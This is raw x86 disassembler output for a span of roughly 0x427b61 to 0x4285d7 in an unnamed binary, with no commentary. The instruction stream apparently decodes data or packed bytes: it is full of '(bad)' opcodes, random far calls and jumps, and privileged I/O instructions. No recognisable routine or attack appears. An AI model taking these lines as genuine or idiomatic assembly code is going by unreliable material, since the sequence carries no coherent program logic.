  427b61:	xor    eax,0x6eb68bd8
  427b66:	jns    0x427b3d
  427b68:	frstor [edi+0x581bf839]
  427b6e:	push   cs
  427b6f:	push   esi
  427b70:	xchg   ebx,eax
  427b71:	call   0x6396:0xb514bd9d
  427b78:	pop    edi
  427b79:	mov    ah,al
  427b7b:	inc    ebx
  427b7c:	loopne 0x427ba8
  427b7e:	mov    edi,0x9e997c06
  427b83:	mov    ds:0xc8f15e6a,eax
  427b88:	and    al,BYTE PTR [ebx-0x68]
  427b8b:	sbb    al,0x24
  427b8d:	(bad)  
  427b8e:	mov    WORD PTR [eax-0x6e],cs
  427b91:	mov    bl,0xa
  427b93:	call   DWORD PTR [ebx]
  427b95:	nop
  427b96:	into   
  427b97:	and    DWORD PTR [ebp-0x5d],esi
  427b9a:	jge    0x427bdf
  427b9c:	jmp    0x427b6f
  427b9e:	jle    0x427c09
  427ba0:	push   eax
  427ba1:	inc    ebx
  427ba2:	mov    esp,esp
  427ba4:	popf   
  427ba5:	mov    ch,0xc2
  427ba7:	(bad)  
  427ba8:	out    0xc1,al
  427baa:	fidivr WORD PTR [edx+0x39]
  427bad:	pop    ecx
  427bae:	jp     0x427b4f
  427bb0:	push   0xe73732d5
  427bb5:	sahf   
  427bb6:	and    al,0xcc
  427bb8:	pop    edx
  427bb9:	aaa    
  427bba:	mov    ds:0xfb0ed38a,al
  427bbf:	jnp    0x427bb5
  427bc1:	stc    
  427bc2:	das    
  427bc3:	xchg   ch,bh
  427bc5:	mov    ds:0x9a62ffc9,eax
  427bca:	xchg   ebp,eax
  427bcb:	jecxz  0x427b76
  427bcd:	pop    es
  427bce:	mov    es,eax
  427bd0:	xchg   edx,eax
  427bd1:	outs   dx,DWORD PTR ds:[esi]
  427bd2:	add    eax,0x151d93e0
  427bd7:	mov    esp,0x84f931a8
  427bdc:	mov    bh,0x61
  427bde:	call   0xbdf0:0x52a86318
  427be5:	nop
  427be6:	cmp    ebx,DWORD PTR [edi-0x5bb02639]
  427bec:	xchg   esi,eax
  427bed:	popa   
  427bee:	frstor [esi-0x1]
  427bf1:	jmp    DWORD PTR [edi+0x37]
  427bf4:	fist   WORD PTR [esi-0x9ed2bfb]
  427bfa:	jmp    0x427ba3
  427bfc:	fiadd  DWORD PTR [edi+0x6b]
  427bff:	pop    ecx
  427c00:	fadd   QWORD PTR [eax-0x3e4ad8c6]
  427c06:	fldcw  WORD PTR [edx]
  427c08:	stos   DWORD PTR es:[edi],eax
  427c09:	sbb    al,dh
  427c0b:	outs   dx,BYTE PTR ds:[esi]
  427c0c:	pop    ds
  427c0d:	push   ss
  427c0e:	inc    ebx
  427c0f:	lahf   
  427c10:	sbb    BYTE PTR [ebx],dh
  427c12:	out    dx,al
  427c13:	mov    ecx,DWORD PTR [eax+0x3f]
  427c16:	inc    edx
  427c17:	dec    edi
  427c18:	fsub   DWORD PTR [edx-0x5b773b41]
  427c1e:	mov    bh,0x23
  427c20:	push   ds
  427c21:	and    ecx,DWORD PTR [eax+0x5e]
  427c24:	xor    DWORD PTR [esi+0xb],edx
  427c27:	inc    edx
  427c28:	in     al,0xb8
  427c2a:	inc    ebp
  427c2b:	mov    dh,0xbf
  427c2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427c2e:	shl    DWORD PTR [esi+0x17aab5f3],cl
  427c34:	test   DWORD PTR [eax],eax
	...
  427c96:	mov    ds:0xf343b050,eax
  427c9b:	jecxz  0x427c90
  427c9d:	lock xchg edi,eax
  427c9f:	fmul   DWORD PTR ds:0x6ff6585
  427ca5:	cwde   
  427ca6:	mov    ecx,0x70001a8
  427cab:	add    DWORD PTR [eax],eax
  427cad:	add    cl,al
  427caf:	ins    BYTE PTR es:[edi],dx
  427cb0:	pop    ecx
  427cb1:	add    BYTE PTR [ecx],ah
  427cb3:	adc    DWORD PTR ds:0xc15fd2dd,ebp
  427cb9:	pop    ebx
  427cba:	dec    esi
  427cbb:	or     ch,al
  427cbd:	xor    BYTE PTR [ecx+eax*4-0x3cf1df02],ah
  427cc4:	int3   
  427cc5:	cmp    BYTE PTR [esi+0xd805bfe],ch
  427ccb:	mov    esp,0x90ef42a2
  427cd0:	dec    ecx
  427cd1:	pop    edi
  427cd2:	pusha  
  427cd3:	dec    ecx
  427cd4:	nop
  427cd5:	jns    0x427c84
  427cd7:	pop    ecx
  427cd8:	push   edi
  427cd9:	fidiv  WORD PTR gs:[ebx+0x6a185d36]
  427ce1:	sub    edi,DWORD PTR [edx-0x25]
  427ce4:	push   ss
  427ce5:	push   cs
  427ce6:	xor    BYTE PTR [ebx-0x3e3a24b4],al
  427cec:	push   cs
  427ced:	push   0xd74bdcb
  427cf2:	leave  
  427cf3:	stos   DWORD PTR es:[edi],eax
  427cf4:	ret    
  427cf5:	jb     0x427d05
  427cf7:	dec    ebp
  427cf8:	repz adc dl,ch
  427cfb:	sub    al,0x8b
  427cfd:	repz xor BYTE PTR ds:0x16fd81d0,dl
  427d04:	fld1   
  427d06:	(bad)  
  427d07:	push   ebp
  427d08:	stos   BYTE PTR es:[edi],al
  427d09:	out    0x6d,eax
  427d0b:	inc    eax
  427d0c:	stos   DWORD PTR es:[edi],eax
  427d0d:	add    eax,0xfb7d260a
  427d12:	add    bh,BYTE PTR [edi+0x58e7baa3]
  427d18:	outs   dx,DWORD PTR ds:[esi]
  427d19:	iret   
  427d1a:	jae    0x427d16
  427d1c:	std    
  427d1d:	sub    al,BYTE PTR [esi+eiz*8]
  427d20:	retf   
  427d21:	mov    dh,0x7f
  427d23:	in     eax,dx
  427d24:	(bad)  
  427d25:	pop    edi
  427d26:	mov    fs,WORD PTR [ecx-0x73e4a49b]
  427d2c:	out    dx,al
  427d2d:	add    dl,BYTE PTR [eax+edi*2+0x6c478b8a]
  427d34:	shl    dl,1
  427d36:	sti    
  427d37:	adc    BYTE PTR [ecx-0x4f],ah
  427d3a:	sbb    DWORD PTR [eax],0xffffffe3
  427d3d:	jno    0x427d28
  427d3f:	cmc    
  427d40:	pop    eax
  427d41:	jge    0x427cc9
  427d43:	inc    edi
  427d44:	and    ch,BYTE PTR [ebp+eax*8-0x452108e5]
  427d4b:	sbb    BYTE PTR [eax+0x1ddd3c07],bl
  427d51:	adc    bh,BYTE PTR [edx+0x1af8eae8]
  427d57:	jg     0x427dac
  427d59:	mov    eax,ds:0x46470cd5
  427d5e:	retf   0x6ba5
  427d61:	sbb    ah,BYTE PTR [eax+0x1ec5a9c1]
  427d67:	ins    BYTE PTR es:[edi],dx
  427d68:	cli    
  427d69:	daa    
  427d6a:	adc    BYTE PTR [esi-0x380bf07e],al
  427d70:	mov    dl,0x87
  427d72:	mov    ds:0xa8b43941,eax
  427d77:	addr16 cmc 
  427d79:	repz fldcw WORD PTR ss:[ebx+0x1c3a835d]
  427d81:	or     DWORD PTR [ebx-0x73bc7bb5],0x15
  427d88:	lea    ecx,[esi]
  427d8a:	or     BYTE PTR [eax-0x2d125ba2],dh
  427d90:	pusha  
  427d91:	mov    ecx,0x1a57edd9
  427d96:	rcr    DWORD PTR [edi],cl
  427d98:	dec    esp
  427d99:	outs   dx,DWORD PTR ds:[esi]
  427d9a:	pop    ds
  427d9b:	xchg   edi,eax
  427d9c:	adc    ah,BYTE PTR [ecx*4-0x5b3124b6]
  427da3:	jnp    0x427e23
  427da5:	mul    BYTE PTR [ecx+0xf1ff673]
  427dab:	mov    dl,0x1
  427dad:	sub    DWORD PTR [eax+0x6b4a43c7],ebp
  427db3:	cmp    eax,0xd3
	...
  427e14:	add    BYTE PTR [eax],al
  427e16:	mov    eax,0x6d3c25f1
  427e1b:	cld    
  427e1c:	mov    ecx,0xf22c23f5
  427e21:	add    BYTE PTR [ebx+0x6c],ch
  427e24:	mov    esp,ecx
  427e26:	shr    BYTE PTR [ecx+0x1070001],0x0
  427e2d:	add    BYTE PTR ds:0x4de7736a,dh
  427e33:	rcl    BYTE PTR [edx],0x76
  427e36:	fs inc edx
  427e38:	or     BYTE PTR [edx-0x5b],0xc1
  427e3c:	pusha  
  427e3d:	mov    bl,0x12
  427e3f:	outs   dx,DWORD PTR ds:[esi]
  427e40:	and    eax,0x9a61238e
  427e45:	or     ebp,DWORD PTR [ebp-0x796dedf6]
  427e4b:	xlat   BYTE PTR ds:[ebx]
  427e4c:	dec    esi
  427e4d:	xor    eax,0xd7ce00e
  427e52:	jno    0x427def
  427e54:	jns    0x427e4b
  427e56:	adc    DWORD PTR [ecx],esi
  427e58:	mov    ecx,0x9a151e6d
  427e5d:	push   0xb5a0bf58
  427e62:	hlt    
  427e63:	sub    al,0x3c
  427e65:	lock cmp BYTE PTR ds:0xde3c741e,ch
  427e6c:	add    DWORD PTR [ebx],esi
  427e6e:	sbb    eax,0x7a76dfe4
  427e73:	ror    cl,cl
  427e75:	fidivr DWORD PTR [eax+0x73]
  427e78:	call   DWORD PTR [eax+edx*1-0x1ecc4498]
  427e7f:	cwde   
  427e80:	mov    ds:0x237726fa,eax
  427e85:	leave  
  427e86:	mov    ch,0x6d
  427e88:	mov    edx,0xa3f7874
  427e8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427e8e:	adc    eax,DWORD PTR ds:0x5af529eb
  427e94:	lock sub al,0x52
  427e97:	inc    ebx
  427e98:	dec    edx
  427e99:	adc    DWORD PTR [ebx],0x58
  427e9c:	and    DWORD PTR [eax],ebp
  427e9e:	test   al,0x41
  427ea0:	(bad)  
  427ea1:	out    dx,eax
  427ea2:	sbb    eax,0xc48a619f
  427ea7:	xchg   BYTE PTR ds:0xd559f244,dl
  427ead:	mov    cl,0x36
  427eaf:	jl     0x427e80
  427eb1:	push   es
  427eb2:	fbstp  TBYTE PTR [esi]
  427eb4:	mov    cl,0x84
  427eb6:	adc    esi,edx
  427eb8:	pop    edx
  427eb9:	xchg   ebx,eax
  427eba:	sub    DWORD PTR [edi],ecx
  427ebc:	push   ss
  427ebd:	(bad)  
  427ebe:	sar    BYTE PTR [ecx-0x1b],0x94
  427ec2:	sbb    eax,0xa9b0ebc
  427ec7:	mov    ecx,0xe62a663e
  427ecc:	addr16 jl 0x427e66
  427ecf:	pop    es
  427ed0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427ed1:	pop    DWORD PTR [eax+0x7b]
  427ed4:	and    esp,DWORD PTR [esi]
  427ed6:	jmp    0xd2e7:0x7ce4ea94
  427edd:	fsubp  st(5),st
  427edf:	(bad)  
  427ee0:	jno    0x427e6b
  427ee2:	dec    esp
  427ee3:	rol    DWORD PTR [ebp-0x67],1
  427ee6:	cmp    al,0x8d
  427ee8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427ee9:	sbb    eax,DWORD PTR [edx]
  427eeb:	imul   ebp,DWORD PTR [ebx+edi*2+0x7aae7207],0x7a
  427ef3:	mov    ch,0x22
  427ef5:	sbb    eax,0x8a4a18af
  427efa:	dec    edx
  427efb:	xor    DWORD PTR [ebx-0x50],edx
  427efe:	sti    
  427eff:	movlps QWORD PTR [edi],xmm7
  427f02:	test   DWORD PTR ds:0x10552acb,ebp
  427f08:	sar    ebx,cl
  427f0a:	(bad)  
  427f0b:	aaa    
  427f0c:	daa    
  427f0d:	call   0xdfb5:0xe2590f53
  427f14:	daa    
  427f15:	mov    cl,0xfb
  427f17:	jb     0x427f1f
  427f19:	or     eax,0x9fd75151
  427f1e:	xchg   ecx,edx
  427f20:	outs   dx,BYTE PTR ds:[esi]
  427f21:	inc    eax
  427f22:	pop    edx
  427f23:	mov    esi,ecx
  427f25:	xchg   DWORD PTR [ebx],ebp
  427f27:	in     al,dx
  427f28:	les    ebx,FWORD PTR [esi+0x499cee41]
  427f2e:	pop    es
  427f2f:	popa   
  427f30:	ins    DWORD PTR es:[edi],dx
  427f31:	std    
  427f32:	sahf   
  427f33:	ins    BYTE PTR es:[edi],dx
  427f34:	imul   eax,DWORD PTR [eax],0x0
	...
  427f93:	add    BYTE PTR [eax],al
  427f95:	add    BYTE PTR [ecx+0x5f2f4ba7],dh
  427f9b:	out    dx,eax
  427f9c:	cmc    
  427f9d:	mov    edi,0x85e029ac
  427fa2:	sar    DWORD PTR [edx-0x553807de],1
  427fa8:	add    DWORD PTR [eax],eax
  427faa:	pop    es
  427fab:	add    DWORD PTR [eax],eax
  427fad:	add    BYTE PTR [ebp+0x8053e34],ch
  427fb3:	cmp    eax,0xb37a18e6
  427fb8:	jmp    0x7b8efe8b
  427fbd:	es ret 0xbbe7
  427fc1:	shl    DWORD PTR [esi+ecx*4-0x54],cl
  427fc5:	cmp    al,0xd4
  427fc7:	sbb    DWORD PTR [ebx-0x6b],0xffffffb3
  427fcb:	xor    BYTE PTR [ebp+0x83f7390],dl
  427fd1:	mov    eax,0x33a3dcd9
  427fd6:	and    edi,DWORD PTR [esi]
  427fd8:	cwde   
  427fd9:	jo     0x427f6f
  427fdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427fdc:	dec    ebp
  427fdd:	push   ebp
  427fde:	and    eax,0x75b1439e
  427fe3:	repnz xchg ecx,eax
  427fe5:	cmovge edx,DWORD PTR [ebx]
  427fe8:	sbb    BYTE PTR [ebx+0x9553673],ch
  427fee:	shl    edi,0x46
  427ff1:	cmp    BYTE PTR [edx-0x19f0a3a5],dh
  427ff7:	mov    ebx,0x5c2edb6b
  427ffc:	inc    ebp
  427ffd:	jae    0x428005
  427fff:	jp     0x428072
  428001:	push   esp
  428002:	dec    esp
  428003:	cmp    eax,0x19bee1d
  428008:	loop   0x427f8c
  42800a:	out    0xe1,eax
  42800c:	xchg   BYTE PTR [ebx-0x766b10aa],ah
  428012:	pop    ebp
  428013:	pop    ds
  428014:	lods   al,BYTE PTR ds:[esi]
  428015:	mov    ds:0xe306303e,eax
  42801a:	and    dl,bh
  42801c:	adc    edi,ecx
  42801e:	sbb    ch,BYTE PTR [ecx]
  428020:	daa    
  428021:	div    ecx
  428023:	call   0x6a79c798
  428028:	pop    ss
  428029:	das    
  42802a:	ins    DWORD PTR es:[edi],dx
  42802b:	sahf   
  42802c:	mov    ds:0xabd5d214,eax
  428031:	cmp    eax,0x1cd0fe5a
  428036:	rcr    ecx,0x25
  428039:	cld    
  42803a:	and    al,0xa1
  42803d:	xor    BYTE PTR [edi-0x57],dl
  428040:	add    edi,ecx
  428042:	xor    bl,BYTE PTR [edx+0x6a]
  428045:	pop    ss
  428046:	inc    ecx
  428047:	push   eax
  428048:	shl    DWORD PTR [edx-0x34],0xb
  42804c:	outs   dx,DWORD PTR ds:[esi]
  42804d:	scas   al,BYTE PTR es:[edi]
  42804e:	pushf  
  42804f:	mov    esp,0x51ff5942
  428054:	mov    al,ds:0x907788f9
  428059:	fisub  DWORD PTR [ebx-0xd]
  42805c:	iret   
  42805d:	retf   0x648c
  428060:	cmp    al,0xd3
  428062:	adc    BYTE PTR [ebp+0x35],cl
  428065:	mov    edi,DWORD PTR [esi+eiz*2+0x593fcbb7]
  42806c:	mov    ds:0x8f939cd0,eax
  428071:	aad    0x8a
  428073:	mov    esi,0x14aa588f
  428078:	push   0x5123ae51
  42807d:	xor    ebp,ebp
  42807f:	clc    
  428080:	xor    esi,DWORD PTR [ecx-0x59ea91b9]
  428086:	mov    esp,0xf44e2656
  42808b:	sub    dl,BYTE PTR [eax+edi*1-0x3ff04bb5]
  428092:	cmp    eax,0x1173ef5a
  428097:	push   edi
  428098:	mov    cl,0xa5
  42809a:	pusha  
  42809b:	(bad)  
  42809c:	imul   esi,DWORD PTR [edi+0x603d8f1a],0x3b
  4280a3:	loop   0x42807c
  4280a5:	je     0x428052
  4280a7:	ret    
  4280a8:	fbld   TBYTE PTR [edi-0x4aaf0e11]
  4280ae:	mov    DWORD PTR [ecx],0x61467f68
  4280b4:	add    BYTE PTR [eax],0x0
	...
  428113:	add    BYTE PTR [eax],al
  428115:	add    bh,bl
  428117:	out    dx,al
  428118:	std    
  428119:	dec    esp
  42811a:	std    
  42811b:	pop    edi
  42811c:	(bad)  
  42811d:	(bad)  
  42811e:	cmp    al,0x36
  428120:	cmp    esp,ebp
  428122:	dec    eax
  428123:	mov    ds:0xabce60d8,al
  428128:	add    DWORD PTR [eax],eax
  42812a:	pop    es
  42812b:	add    DWORD PTR [eax],eax
  42812d:	add    BYTE PTR [ebx],bl
  42812f:	xor    al,0xc5
  428131:	shl    BYTE PTR [edx-0x17b5cf6a],cl
  428137:	ins    BYTE PTR es:[edi],dx
  428138:	nop
  428139:	loop   0x428185
  42813b:	sub    esp,DWORD PTR [edx-0x1]
  42813e:	dec    ebx
  42813f:	js     0x42818e
  428141:	pop    esi
  428142:	fidivr DWORD PTR [edx-0x18]
  428145:	xor    DWORD PTR ss:[edi+0x37],0xffffffe5
  42814a:	rcl    BYTE PTR [ebx-0x3ee772b],cl
  428150:	mov    al,0x4b
  428152:	es pop es
  428154:	repz cmp edi,DWORD PTR [ecx]
  428157:	mov    al,ds:0x9ed3797c
  42815c:	lahf   
  42815d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42815e:	add    BYTE PTR [edi+0x77],al
  428161:	imul   ebp,DWORD PTR [ebp-0x5dda11cd],0xffffffca
  428168:	push   0xffffffe1
  42816a:	iret   
  42816b:	or     dl,BYTE PTR [edi-0x59f44834]
  428171:	shr    DWORD PTR [edi+0x735b75d7],0xb9
  428178:	adc    ebp,DWORD PTR [ecx+0x5461cf4e]
  42817e:	scas   eax,DWORD PTR es:[edi]
  42817f:	jne    0x428166
  428181:	inc    ebp
  428182:	outs   dx,BYTE PTR ds:[esi]
  428183:	mov    ds:0x10fc9e58,eax
  428188:	dec    ebp
  428189:	add    BYTE PTR [edi-0x2a2c1388],0x41
  428190:	sbb    esp,DWORD PTR [ecx]
  428192:	cmp    eax,DWORD PTR [edi]
  428194:	hlt    
  428195:	jmp    0xfb4c:0x97d62897
  42819c:	pusha  
  42819d:	mov    DWORD PTR [edi-0x4acecfb5],esi
  4281a3:	dec    esp
  4281a4:	ret    0xb2db
  4281a7:	pop    edx
  4281a8:	pusha  
  4281a9:	leave  
  4281aa:	jecxz  0x4281d6
  4281ac:	inc    esp
  4281ad:	pop    ebp
  4281ae:	(bad)  
  4281b0:	dec    edi
  4281b1:	pop    ds
  4281b2:	daa    
  4281b3:	and    eax,0xb1cab6e8
  4281b8:	push   esi
  4281b9:	inc    edi
  4281ba:	hlt    
  4281bb:	push   esi
  4281bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4281bd:	xchg   dl,cl
  4281bf:	xchg   DWORD PTR [eax],eax
  4281c1:	out    dx,eax
  4281c2:	mov    BYTE PTR [edx+0x1e590f5c],bh
  4281c8:	arpl   WORD PTR [esi+0x2],ax
  4281cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4281cc:	mov    ah,0x22
  4281ce:	mov    bl,0x4c
  4281d0:	mov    cl,0x59
  4281d2:	xor    DWORD PTR [ecx],edi
  4281d4:	and    eax,0x7529f1eb
  4281d9:	imul   ebx,DWORD PTR [ebp+0x37e0ac35],0xbad1f048
  4281e3:	int    0xef
  4281e5:	cmp    DWORD PTR [eax+0x3f5d3317],edx
  4281eb:	sbb    DWORD PTR [eax-0x24],edi
  4281ee:	mov    ebx,0x6335914e
  4281f3:	sub    eax,0xbdfb8379
  4281f8:	hlt    
  4281f9:	imul   DWORD PTR [edx+0x70]
  4281fc:	push   eax
  4281fd:	scas   eax,DWORD PTR es:[edi]
  4281fe:	adc    DWORD PTR [ebx+ebx*2],0x72e39f7b
  428205:	pop    eax
  428206:	add    al,0xc1
  428208:	pop    es
  428209:	out    0xde,eax
  42820b:	test   eax,0x4bdc42f6
  428210:	pusha  
  428211:	push   esi
  428212:	add    al,BYTE PTR [edi]
  428214:	in     eax,0xba
  428216:	test   al,0x36
  428218:	jmp    0x766b:0x7c95623d
  42821f:	mov    ebp,0x3ba0ea15
  428224:	repnz or cl,BYTE PTR [ecx-0x2f]
  428228:	sbb    DWORD PTR [ebx-0xf6e11a],0x8a13e724
  428232:	iret   
  428233:	xchg   esp,eax
  428234:	loope  0x428236
	...
  428296:	(bad)  
  428297:	fidiv  WORD PTR [esi]
  428299:	loop   0x4282da
  42829b:	jmp    0x52eb:0x1ad8ffd7
  4282a2:	adc    esi,eax
  4282a4:	inc    ebp
  4282a5:	pop    esp
  4282a6:	aad    0xac
  4282a8:	add    DWORD PTR [eax],eax
  4282aa:	pop    es
  4282ab:	add    DWORD PTR [eax],eax
  4282ad:	add    BYTE PTR [ebx+0x65],bl
  4282b0:	sbb    BYTE PTR [ebx+ebx*8-0x5f],bh
  4282b4:	xchg   esp,eax
  4282b5:	dec    ebp
  4282b6:	out    0x2c,al
  4282b8:	adc    BYTE PTR [eax-0xdf9294f],dl
  4282be:	stos   BYTE PTR es:[edi],al
  4282bf:	adc    DWORD PTR [ecx-0x43e8718a],ebp
  4282c5:	cwde   
  4282c6:	push   ds
  4282c7:	pop    eax
  4282c8:	or     ecx,DWORD PTR [esi-0x27]
  4282cb:	pop    ebp
  4282cc:	repz pushf 
  4282ce:	mov    al,0xae
  4282d0:	mov    esp,0xfd5ca7d4
  4282d5:	in     eax,0x12
  4282d7:	or     BYTE PTR [edx-0x4b],0x13
  4282db:	mov    esp,0x3a87f7ee
  4282e0:	out    dx,al
  4282e1:	leave  
  4282e2:	adc    dl,BYTE PTR [eax]
  4282e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4282e5:	mov    ds:0xb69e098c,al
  4282ea:	inc    esp
  4282eb:	mov    ecx,ecx
  4282ed:	push   cs
  4282ee:	gs inc esi
  4282f0:	ds add al,0x1b
  4282f3:	les    esi,FWORD PTR [edx-0x2c]
  4282f6:	push   es
  4282f7:	dec    esi
  4282f8:	push   0x44
  4282fa:	frstor [eax+0x65]
  4282fd:	cld    
  4282fe:	out    0x88,eax
  428300:	mov    eax,0x99b84acd
  428305:	mov    edx,0xe73d204f
  42830a:	and    dh,0xcb
  42830d:	jnp    0x428316
  42830f:	dec    esi
  428310:	ja     0x4282d4
  428312:	cli    
  428313:	pop    edi
  428315:	mov    edi,0x63b81d06
  42831a:	(bad)  
  42831b:	rol    edi,cl
  42831d:	repnz push ecx
  42831f:	cmp    DWORD PTR [edi],0x8
  428322:	adc    dl,BYTE PTR [esi]
  428324:	aam    0x5b
  428326:	dec    ebp
  428327:	mov    eax,ds:0x4fc5a340
  42832c:	enter  0xb4f1,0xc
  428330:	retf   0x3027
  428333:	xchg   edx,eax
  428334:	dec    edx
  428335:	dec    esi
  428336:	mov    ecx,0xbb284f1d
  42833b:	cmc    
  42833c:	retf   0x2e29
  42833f:	inc    edx
  428340:	lods   eax,DWORD PTR ds:[esi]
  428341:	ret    0xa3fd
  428344:	sub    eax,0x6eab1f35
  428349:	fdivr  QWORD PTR [edi]
  42834b:	pop    edi
  42834c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42834d:	and    eax,0xa751d054
  428352:	jnp    0x4283cd
  428354:	push   es
  428355:	retf   0x958f
  428358:	push   cs
  428359:	mov    dl,0xca
  42835b:	or     dh,BYTE PTR [edx+0x3f0b4024]
  428361:	or     BYTE PTR [edi+0x64],0x9b
  428365:	fwait
  428366:	push   ecx
  428367:	xor    edx,edx
  428369:	mov    ebp,0xe9a831a2
  42836e:	test   BYTE PTR [edx-0x6d2d4666],al
  428374:	sub    ecx,0xbadb6bd7
  42837a:	loopne 0x4283be
  42837c:	add    BYTE PTR [esi+0x63e02852],cl
  428382:	xchg   ebp,eax
  428383:	jb     0x42839c
  428385:	jge    0x428341
  428387:	cmp    esp,eax
  428389:	loop   0x428408
  42838b:	mov    eax,ds:0xa4bec504
  428390:	add    ebx,DWORD PTR [ecx-0x43]
  428393:	mov    esi,0x34efcb45
  428398:	push   edi
  428399:	push   ebx
  42839a:	jl     0x4283b0
  42839c:	sub    al,BYTE PTR [ecx+0x7d36ffdf]
  4283a2:	inc    ebx
  4283a3:	mov    ebp,0x504eeb6d
  4283a8:	inc    eax
  4283a9:	aas    
  4283aa:	pop    ebp
  4283ab:	fimul  WORD PTR [ebp-0x2b]
  4283ae:	mov    ch,0x69
  4283b0:	push   ebx
  4283b1:	xchg   ebx,eax
  4283b2:	jl     0x42838b
  4283b4:	aad    0x0
	...
  428416:	push   cs
  428417:	xchg   esp,eax
  428418:	jg     0x42847d
  42841a:	(bad)  
  42841b:	jmp    0x42843b
  42841d:	std    
  42841e:	push   ebx
  42841f:	int    0x1
  428421:	inc    BYTE PTR [ecx]
  428423:	sbb    eax,0xaddc6d56
  428428:	add    DWORD PTR [eax],eax
  42842a:	pop    es
  42842b:	add    DWORD PTR [eax],eax
  42842d:	add    BYTE PTR [eax-0x13],al
  428430:	(bad)  
  428431:	dec    ebp
  428432:	(bad)  
  428433:	and    al,0x7a
  428435:	ror    edx,0xfe
  428438:	pop    eax
  428439:	xchg   bh,cl
  42843b:	mov    bl,0x15
  42843d:	sbb    al,0xb
  42843f:	xchg   ecx,eax
  428440:	dec    esp
  428441:	(bad)  
  428442:	(bad)  
  428443:	pop    esi
  428444:	xor    esi,DWORD PTR [esi-0x38612605]
  42844a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42844b:	test   DWORD PTR [ebx],ebx
  42844d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42844e:	mov    dh,BYTE PTR [eax+0x4b87b485]
  428454:	or     BYTE PTR [esi-0x473baa35],bh
  42845a:	popf   
  42845b:	jno    0x42842b
  42845d:	imul   ebp,esi,0xffffff87
  428460:	cmp    al,0xed
  428462:	fimul  WORD PTR [ecx]
  428464:	or     esi,DWORD PTR [ebp-0x39]
  428467:	mov    bh,0x1d
  428469:	jb     0x428439
  42846b:	sar    DWORD PTR [edi-0x258df06f],cl
  428471:	dec    ebx
  428472:	add    esi,DWORD PTR [esi+edi*1]
  428475:	jl     0x4284f3
  428477:	mov    ds:0x6d8e537f,al
  42847c:	inc    edi
  42847d:	(bad)  
  42847f:	int    0xa5
  428481:	out    dx,al
  428482:	xchg   edx,eax
  428483:	adc    BYTE PTR [edx-0x867ca09],cl
  428489:	mov    ah,0xc0
  42848b:	jbe    0x4284b6
  42848d:	mov    esp,0x298f364
  428492:	outs   dx,DWORD PTR ds:[esi]
  428494:	daa    
  428495:	in     al,dx
  428496:	dec    esi
  428497:	mov    edx,0xe234ca58
  42849c:	aad    0x45
  42849e:	cmp    DWORD PTR ds:0x9f67eca8,0xffffffed
  4284a5:	xchg   ecx,eax
  4284a6:	mov    eax,ds:0x89e9c2be
  4284ab:	mov    esi,0x751083cb
  4284b0:	pop    eax
  4284b1:	retf   0x23bf
  4284b4:	sub    bl,BYTE PTR [ecx]
  4284b6:	and    eax,0x669c85bb
  4284bb:	fidivr DWORD PTR [ecx+0x3dad66e8]
  4284c1:	xchg   edx,eax
  4284c2:	xchg   edx,eax
  4284c3:	stos   BYTE PTR es:[edi],al
  4284c4:	mov    DWORD PTR [esp+ecx*8],ecx
  4284c7:	xchg   DWORD PTR [esi],esp
  4284c9:	(bad)  
  4284ca:	pop    ebx
  4284cb:	rcl    BYTE PTR [eax-0x61],0x35
  4284cf:	pushf  
  4284d0:	fsub   QWORD PTR ds:[ebx+0x323280b6]
  4284d7:	arpl   WORD PTR [ecx+ebx*4+0x779cf7e],ax
  4284de:	inc    edi
  4284df:	and    cl,BYTE PTR [ecx-0x7a09ae46]
  4284e5:	sub    esp,ecx
  4284e7:	ffreep st(7)
  4284e9:	jle    0x4284c3
  4284eb:	(bad)  
  4284ed:	mov    ah,0xa2
  4284ef:	out    dx,eax
  4284f0:	jecxz  0x4284b3
  4284f2:	xor    eax,0x2c62e62
  4284f7:	pushf  
  4284f8:	jmp    0xc4fc:0x78802fb
  4284ff:	cmp    al,0xfd
  428501:	leave  
  428502:	ffreep st(4)
  428504:	out    dx,eax
  428505:	fimul  DWORD PTR [ecx+0x6610afe8]
  42850b:	and    eax,0xf6c81cdc
  428510:	sub    al,0xa4
  428512:	out    dx,al
  428513:	jp     0x42853f
  428515:	push   eax
  428516:	scas   eax,DWORD PTR es:[edi]
  428517:	add    ah,BYTE PTR [edx]
  428519:	cmp    eax,DWORD PTR [edx+0x296da835]
  42851f:	lds    eax,FWORD PTR [ecx+ecx*1-0x42116716]
  428526:	enter  0x2580,0x91
  42852a:	(bad)
  42852d:	leave  
  42852e:	mov    ah,0x51
  428530:	popf   
  428531:	dec    esi
  428532:	push   eax
  428533:	cmp    eax,DWORD PTR [edx+0x0]
	...
  428595:	add    BYTE PTR [ecx-0xa],dl
  428598:	xor    eax,0x5bffb73e
  42859d:	dec    ebp
  42859f:	sar    BYTE PTR [ecx-0x50],cl
  4285a2:	push   ds
  4285a3:	adc    edx,DWORD PTR [ebx+0x1aee3f0]
  4285a9:	add    BYTE PTR [edi],al
  4285ab:	add    DWORD PTR [eax],eax
  4285ad:	add    BYTE PTR [ecx+0x52],bl
  4285b0:	pushf  
  4285b1:	bswap  ebx
  4285b3:	les    ecx,FWORD PTR [edx-0x58723fc0]
  4285b9:	add    bl,cl
  4285bb:	dec    dx
  4285bd:	scas   al,BYTE PTR es:[edi]
  4285be:	xchg   esp,eax
  4285bf:	sbb    DWORD PTR [ecx+0x1518553d],edi
  4285c5:	ins    BYTE PTR es:[edi],dx
  4285c6:	scas   eax,DWORD PTR es:[edi]
  4285c7:	jae    0x4285ac
  4285c9:	pop    ebx
  4285ca:	clc    
  4285cb:	fcomp  QWORD PTR [ecx-0x70]
  4285ce:	test   al,0xce
  4285d0:	dec    edi
  4285d1:	aam    0xb1
  4285d3:	add    al,0x24
  4285d5:	sti    
  4285d6:	xchg   esp,eax
  4285d7:	lds    esp,FWORD PTR [esi-0x7920732d]
